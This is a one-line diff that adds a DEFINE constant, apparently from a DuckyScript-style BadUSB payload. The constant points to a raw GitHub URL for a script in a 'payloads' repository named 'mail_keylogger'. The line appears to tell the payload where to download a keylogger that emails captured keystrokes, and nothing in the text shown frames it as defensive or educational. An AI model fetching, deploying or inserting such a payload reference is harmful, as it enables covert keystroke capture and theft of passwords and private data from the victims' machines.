@@ -1,0 +1,1 @@
+DEFINE #SCRIPTURL https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/mail_keylogger/script.py
